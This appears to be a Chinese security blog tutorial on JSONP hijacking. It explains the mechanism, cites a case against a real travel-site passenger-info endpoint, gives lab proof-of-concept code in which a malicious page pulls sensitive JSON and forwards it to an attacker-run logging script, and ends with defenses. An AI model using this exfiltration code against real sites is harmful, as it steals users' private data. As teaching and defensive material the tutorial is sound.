---
title: JSONP 劫持入门
categories:
  - Web安全
tags:
  - jsonp
abbrlink: 84da2c8b
date: 2019-01-06 16:53:11
---

&#8195;&#8195;JSONP（JavaScript Object Notation with Padding） 是 JSON 的一种“使用模式”，主要解决跨域读取数据的问题，由此引发的 JSONP 劫持，原理上和 CSRF 类似，诱导用户访问恶意 JS 窃取用户敏感信息，当然还可能造成其他危害，具体取决于能获取到的敏感信息，以及对 callback 函数的处理方式，乌云有很多案例可参考。
<!-- more -->

## JSONP 劫持
1. 客户端利用 `<script>` 标签的 src 属性不受同源限制的特性，向网页中动态插入 `<script>` 标签，来向服务端请求数据。
2. 服务端根据客户端提供的 callback 参数，将数据放入其中返回给客户端。
3. 返回给客户端的数据其实是 JS 格式，会触发本地回调函数，从而对数据进行处理。

看一个乌云的例子：
```
<script>
function qunarcallback(json){
	alert(JSON.stringify(json))
}
</script>

<script src="http://tinfo.qunar.com/ticket/passenger/passenger_info.jsp?&type=passenger&callback=qunarcallback"></script>
```
![效果](/imgs/jsonp2.png)

&#8195;&#8195;使用`<script>` 请求服务端数据，服务端返回的数据会用 callback 传入的参数 qunarcallback 包裹，而 qunarcallback 是本地定义好的函数，所以服务端返回的数据会作为该函数的参数执行。

&#8195;&#8195;这种跨域方式其实与 ajax XmlHttpRequest 协议无关。如果未作防范，构造恶意 jsonp 调用页面，诱导用户访问就能获取用户敏感信息，测试如下：
> 1. js.html ————实际的劫持 poc ，实战中放到黑客控制的 vps 上；
> 2. api.php ————模拟有漏洞的 jsonp 接口，在有漏洞的 web 服务器上；
> 3. logs.php ————黑客 vps 记录劫持记录的后端页面。

流程如下：
![jsonp劫持流程](/imgs/jsonp1.png)

代码如下：
api.php
```
<?php
header('Content-type:application/json');
echo $_GET['callback']."({\"admin\":\"hahahaha"."\"})";
?>
```

js.html
```
<script type="text/javascript" src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"></script>

<script type="text/javascript">

  $.getJSON("http://192.168.125.135/csrf/api.php?callback=?", function(json){
     alert(json.admin);
     var data=json.admin;
     $.get("http://192.168.125.135/csrf/logs.php?mylogs="+data, function(res, status){
        alert('OK');
  });
})
</script>
```

logs.php
```
<?php
  $time = date("Y_m_d_h_i_s");
  $filename = $time."_".rand(1,29999).".txt";
  $log = $_GET['mylogs'];
  $httpheader = "HTTP_HEADER\r\n";
  foreach ($_SERVER as $name => $value) {
      $httpheader=$httpheader."$name: $value\r\n";
  }
  echo file_put_contents($filename, $httpheader."\r\n".$log);

?>
```
&#8195;&#8195;js.html 中第一个 ajax 请求，模拟 csrf 向服务器请求返回账号敏感信息。第二个 ajax 请求，模拟 vps 的 jspoc 成功解析到敏感信息，并且做一个 log 记录。也可直接解析 json ：
```
<script>
function hack(json){
alert(JSON.stringify(json)); //接下来可以做转发记录
}

</script>
<script src="http://127.0.0.1:8081/js.php?callback=hack"></script>
```

jsonp 跨域也有一定的局限性：
> 1. 它需要后端的配合，因为后端的接口需要根据约定的参数获取回调函数名，然后跟返回数据进行拼接，最后进行响应。
> 2. 它只能进行异步的调用，因为它的原理是通过动态生成 `<script>` 加载 JS 的方法，而这个过程是异步的，所以如果你想进行同步的调用，那么这个方法就无能为力了。

同源相关可参考 [同源策略和跨域](http://www.gokuweb.com/websec/28c252a.html)

## JSONP 防御
1. 跟 CSRF 一样，限制 referer 或者使用 token 。
2. 严格定义 Content-Type: application / json; charset=utf-8 。
3. 过滤 callback 以及 JSON 数据输出。

## 参考
[jsonp劫持入门玩法](https://secvul.com/topics/1382.html)
[什么是jsonp](http://www.bejson.com/knownjson/aboutjsonp/)
[JSONP挖掘与高级利用](http://www.ijilei.com/6243)
[读取型CSRF-需要交互的内容劫持](https://gh0st.cn/archives/2018-03-22/1)
[读取型CSRF-需要交互的内容劫持](https://gh0st.cn/archives/2018-03-22/1)

